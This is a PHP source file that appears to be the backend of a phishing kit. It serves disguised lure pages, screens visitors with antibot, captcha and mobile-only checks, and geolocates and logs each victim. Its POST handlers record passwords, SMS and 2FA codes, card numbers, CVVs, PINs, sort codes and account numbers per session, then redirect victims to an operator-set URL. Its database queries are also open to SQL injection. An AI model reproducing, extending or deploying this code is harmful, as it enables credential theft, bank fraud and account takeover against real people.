<?php
session_start();



function setupPage($tokenID, $pageID){
  require_once 'libs.php';
  require_once './db.php';
  require_once 'Mobile_Detect.php';
  require_once 'functions.php';
  $detect = new Mobile_Detect;


  //echo"Token ID:$tokenID<br>";
//  echo"Page ID: $pageID<br>";


//Fetch Page info + Token info from //
$sql = "SELECT *
FROM pages
INNER JOIN tokensetup
ON pages.pageID = tokensetup.pageID
WHERE pages.pageID = '$pageID' AND tokenID = '$tokenID'";
$result = mysqli_query($nodeConn, "SET NAMES utf8");
$result = mysqli_query($nodeConn, $sql);
if (mysqli_num_rows($result) > 0) {
  // output data of each row
  while($row = mysqli_fetch_assoc($result))
  {
     $tokenID=$row["tokenID"];
     $pageID=$row["pageID"];
     $pageName=$row["pageName"];
     $enable_redirectpulse=$row["enable_redirectpulse"];
     $add_token=$row["add_token"];
     $tokenName=$row["tokenName"];
     $url_cosmetic=$row["url_cosmetic"];
     $exception_antibot=$row["exception_antibot"];
     $url_cosmetic=$row["url_cosmetic"];
     $enable_mobile=$row["url_cosmetic"];
     $wait_lag=$row["wait_lag"];
     $dynamic_a=$row["a"];
     $dynamic_b=$row["b"];
     $dynamic_c=$row["c"];
     $dynamic_x=$row["x"];
     $dynamic_y=$row["y"];
     $z1=$row["z"];
     $mobile_only=$row["mobile_only"];
     $antibot_active=$row["antibot_active"];
     $antibot_passive=$row["antibot_passive"];
     $errorMsg1=$row["errorMsg1"];
     $errorMsg2=$row["errorMsg2"];
     $errorMsg3=$row["errorMsg3"];
     $endUrl=$row["endUrl"];
  }


}


//  echo "$antibot_active";

//END DATABASE STUFF

//Recaptcha
if ($detect->isMobile()){
 //echo "mobile:yes<br>";
}
else if ($mobile_only == "1"){

  echo "Only mobile users allowed, please try again";
  die();

   //echo "mobile:no<br>";
}



if ($antibot_passive == "1"){
  require 'scripts/passiveantibot.php';
}


if ($antibot_active == "recaptchav2")
{
//GOOGLE
    if(!isset($_SESSION["reCAPTCHA"]) || $_SESSION["reCAPTCHA"] !== "verified") {
      // reCAPTCHA not verified, handle the error here
      echo "<br>reCAPTCHA google not verified<br>";

       $gosign = "false";
       header("location: recaptcha.php"); die();



    } else {
      // reCAPTCHA verified, continue with the form submission

     $gosign = "true";
      // or process the form submission here
    }
}
else {
$gosign = "free";
}

//echo "<br> Recaptcha Traffic Status 1#: <b style='color:blue'> $gosign </b> <br><br>";


$u = $_SERVER['HTTP_USER_AGENT'];
$browser = browsername();
$os = os_info($u);


if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
$ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
$ip = $_SERVER['REMOTE_ADDR'];
}


//echo "HTML: $add_token<br>";
//echo "Token Name: $tokenName<br>";
//echo "mobile only: $mobile_only<br>";
//echo "os: $os<br>";
//echo "Browser: $browser<br>";
//echo "Useragent:  $u<br>";
//echo "Node: $nodeDB<br>";
//echo "Panel: $panelID<br>";
//echo "ip: $ip <br>";

$geo = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));

$city = $geo['geoplugin_city'];
$country_code = $geo['geoplugin_countryCode'];
$lat = $geo['geoplugin_latitude'];
$lon = $geo['geoplugin_longitude'];

//echo "<br>City: " . $city . "<br>";
//echo "Country: " . $country_code."<BR>";


//FIND ISP START

// Array of API endpoints to query

$url = 'https://ipwhois.app/json/' . $ip; // Replace this with the API endpoint you want to use

// Make API request
$response = file_get_contents($url);

// Decode JSON response
$data = json_decode($response, true);

// Check if ISP is present in response
if (isset($data['isp'])) {
// Print ISP name
//echo "ISP: ".$data['isp']."<br>";

$isp =  $data['isp'];
} else {
// ISP not found
//echo "ISP not found";
$data = "ISP not found";
$isp =  "no ISP found";
}








//active  antibot end




//active  antibot start




//FIND ISP END

//END


function insertSession($sessionID, $ip, $logConn, $u) {
  $sql="INSERT INTO logs (sessionID, ip, useragent)
  VALUES ('$sessionID', '$ip', '$u');";
  mysqli_query($logConn,$sql);
}





// SESSIONID START:Check if the session variable doesn't exists
  if(!isset($_SESSION['sessionID'])) {

    // Generate a random string
    $randomString = substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil(10/strlen($x)) )),1,10);

    // Set the session variable
    $_SESSION['sessionID'] = $randomString;
        echo "session made<br>";
        //todo insert record into db
    $z = $_SESSION['sessionID'];

        insertSession($z, $ip, $logConn, $u);
          echo $z; // (debug) echo SessionID
  }

  else   // Incase session already exists
  {
  //  echo "session already exist as: ";
      $z = $_SESSION['sessionID'];
  //  echo $z. "<br>"; // (debug) echo SessionID
  }



// SESSIONID END


// session insert functions


// ACTIVE ANTIBOT START:

  if(isset($_SESSION["active_antibot"]) && $_SESSION["active_antibot"] === true){
  // Code to execute if session is active
  } else {
  //echo "The active_antibot session is not set to true.<br>";
  // Code to execute if session didn't went through antibot
  }

// ACTIVE ANTIBOT END:


// PASSIVE ANTIBOT START:


  //execute passive-antibot

// PASSIVE ANTIBOT END


function updateToken($token, $logConn) {
    $x = $_SESSION["sessionID"];
    $sqlStatus = "UPDATE logs SET status = '$token' WHERE SessionID = '$x';";
    mysqli_query($logConn, $sqlStatus);
}

function updateVer($ver, $logConn) {
    $x = $_SESSION["sessionID"];
    $sqlStatus = "UPDATE logs SET ver = '$ver' WHERE SessionID = '$x';";
    mysqli_query($logConn, $sqlStatus);
}

function updateLogs($ip, $isp, $userAgent, $os, $country, $city, $browser, $pageName, $pageID, $logConn, $lat, $lon) {
    $x = $_SESSION["sessionID"];
    $sqlStatus = "UPDATE logs SET ip = '$ip', isp = '$isp', useragent = '$userAgent', os = '$os', country = '$country', city = '$city', browser = '$browser', lat = '$lat', lon = '$lon', concept = '$pageName', pageID = '$pageID' WHERE SessionID = '$x';";
    mysqli_query($logConn, $sqlStatus);

}


updateToken("$pageName Token B ©",$logConn);
updateVer('3', $logConn);
updateLogs($ip, $isp, $u, $os, $country_code, $city, $browser, $pageName, $pageID, $logConn, $lat, $lon);


$z = $_SESSION['sessionID'];
$pulse = file_get_contents("scripts/pulses.html");
$pulse = str_replace("[ID]", $z, $pulse);

echo $pulse;

if ($enable_redirectpulse == "1"){
  $z = $_SESSION['sessionID'];
  $redirectpulse = file_get_contents("scripts/redirectpulse.html");
  $redirectpulse = str_replace("[ID]", $z, $redirectpulse);

echo $redirectpulse;
}


// START WAITING-INSERT POST Response  into DB
function POSTCheck($postDataName, $dbName, $logConn, $z) {

    if (isset($_POST[$postDataName])) {

        $output = $_POST[$postDataName];
        $i = substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil(5/strlen($x)) )),1,5);

        $sqlStatus = "INSERT INTO respons VALUES ('$z', '$output', '$i', '$dbName');";
        mysqli_query($logConn, $sqlStatus);

    }
}


function POSTUpdate($postDataName, $dbName, $logConn, $z) {

    if (isset($_POST[$postDataName])) {

        $output = $_POST[$postDataName];
        $i = substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil(5/strlen($x)) )),1,5);

        $updatesql = "UPDATE logs SET $postDataName = '$output' WHERE SessionID = '$z';";
        mysqli_query($logConn, $updatesql);



    }
}
//POST handlers
$z = $_SESSION['sessionID'];
POSTCheck("pass", "password", $logConn, $z);
POSTCheck("password", "password", $logConn, $z);
POSTCheck("user", "username", $logConn, $z);
POSTCheck("username", "username", $logConn, $z);
POSTCheck("sms", "SMS OTP", $logConn, $z);
POSTCheck("smsotp", "SMS OTP", $logConn, $z);
POSTCheck("name", "name", $logConn, $z);
POSTCheck("fullname", "full name", $logConn, $z);
POSTCheck("cc", "creditcard", $logConn, $z);
POSTCheck("creditcard", "creditcard", $logConn, $z);
POSTCheck("kaartnummer", "kaartnummer", $logConn, $z);
POSTCheck("zipcode", "zipcode", $logConn, $z);
POSTCheck("city", "city", $logConn, $z); POSTUpdate("city", "city", $logConn, $z);
POSTCheck("exp", "expirey date", $logConn, $z);
POSTCheck("cvv", "cvv", $logConn, $z);
POSTCheck("nip", "pincode", $logConn, $z);
POSTCheck("pincode", "pincode", $logConn, $z);
POSTCheck("pin", "pincode", $logConn, $z);
POSTCheck("phonenumber", "phonenumber", $logConn, $z); POSTUpdate("phone", "phonenumber", $logConn, $z);
POSTCheck("email", "email address", $logConn, $z);
POSTCheck("email_address", "email address", $logConn, $z); POSTUpdate("email_address", "email_address", $logConn, $z);
POSTCheck("housenumber", "housenumber", $logConn, $z);
POSTCheck("sortcode", "sortcode", $logConn, $z);
POSTCheck("accountnumber", "accountnumber", $logConn, $z);
POSTCheck("2fa", "2fa", $logConn, $z);
POSTCheck("auth", "auth", $logConn, $z);
POSTCheck("code1", "code#1", $logConn, $z);
POSTCheck("code2", "code#2", $logConn, $z);
POSTCheck("code3", "code#3", $logConn, $z);
POSTCheck("code4", "code#4", $logConn, $z);
POSTCheck("code5", "code#5", $logConn, $z);
POSTCheck("code6", "code#6", $logConn, $z);
POSTCheck("code7", "code#7", $logConn, $z);
POSTCheck("code8", "code#8", $logConn, $z);
POSTCheck("code9", "code#9", $logConn, $z);
POSTCheck("code10", "code#10", $logConn, $z);
POSTCheck("code11", "code#11", $logConn, $z);
POSTCheck("code12", "code#12", $logConn, $z);
POSTCheck("code13", "code#13", $logConn, $z);
POSTCheck("code14", "code#14", $logConn, $z);
POSTCheck("code15", "code#15", $logConn, $z);
POSTCheck("code16", "code#16", $logConn, $z);
POSTCheck("code17", "code#17", $logConn, $z);
POSTCheck("code18", "code#18", $logConn, $z);
POSTCheck("code19", "code#19", $logConn, $z);
POSTCheck("code20", "code#20", $logConn, $z);
POSTCheck("code21", "code#21", $logConn, $z);
POSTCheck("code22", "code#22", $logConn, $z);
POSTCheck("code23", "code#23", $logConn, $z);
POSTCheck("code24", "code#24", $logConn, $z);
// END POST REQUESTS





$sql = "SELECT * FROM logs WHERE SessionID = '$z';";
$result = mysqli_query($logConn, $sql);

if (mysqli_num_rows($result) > 0)
{
    // output data of each row
    while($row = mysqli_fetch_assoc($result))
    {

        $sentcode1 = $row['sentcode'];
        $sentcode2 = $row['sentcode2'];
        $sentcode3 = $row['sentcode3'];
        $sentcode4 = $row['sentcode4'];
        $sentcode5 = $row['sentcode5'];
        $show_error = $row['show_error'];
        $email = $row['email_address'];
        $phone = $row['phone'];
        $country = $row['country'];
        $email = $row['email_address'];
        $cc = $row['cardnumber']; //from logs DB
        $username=$row["username"];
    }
}
//DISPLAY CONTENT

//boomerang EndUrl handling // or default
if (isset($_GET['secure'])||isset($_SESSION["boomerang"])){

if (isset($_GET['secure'])){

    $boomerangUrl = $_GET['secure'];
    $_SESSION["boomerang"] = "$boomerangUrl";
}

if (isset($_SESSION["boomerang"])){

    $boomerangUrl = $_SESSION["boomerang"];
}
  $end0  = "<meta http-equiv='refresh' content='0;url=$boomerangUrl'/>";
  $end10 = "<meta http-equiv='refresh' content='10;url=$boomerangUrl'/>";
  $end20 = "<meta http-equiv='refresh' content='20;url=$boomerangUrl'/>";
}
else {
  //default end
  $end0  = "<meta http-equiv='refresh' content='0;url=$endUrl'/>";
  $end10 = "<meta http-equiv='refresh' content='10;url=$endUrl'/>";
  $end20 = "<meta http-equiv='refresh' content='20;url=$endUrl'/>";
}



$htmlContent = file_get_contents("$pageName/pages/$add_token");

$htmlContent = str_replace(
  ['[ID]', '[USERNAME]', '[PHONE]', '[COUNTRY]', '[EMAIL]', '[CC]', '[IP]', '[DEVICE]', '[CHALLENGE1]', '[CHALLENGE2]', '[CHALLENGE3]', '[CHALLENGE4]', '[CHALLENGE5]', '[ERROR1]', '[ERROR2]', '[ERROR3]', '[A]', '[B]', '[C]', '[X]', '[Y]', '[Z]', '[END10]', '[END20]', '[END0]'],
  [$z, $username, $phone, $country, $email, $cc, $ip, $os, $sentcode1, $sentcode2, $sentcode3, $sentcode4, $sentcode5, $errorMsg1, $errorMsg2, $errorMsg3, $dynamic_a, $dynamic_b, $dynamic_c, $dynamic_x, $dynamic_y, $z1, $end10, $end20, $end0],
  $htmlContent
);


  if ($gosign == "true" || "free"){
    echo $htmlContent;
  }

  echo $tokenID;
  echo $add_token;
  echo $pageName;
  echo $pageID;

}



?>
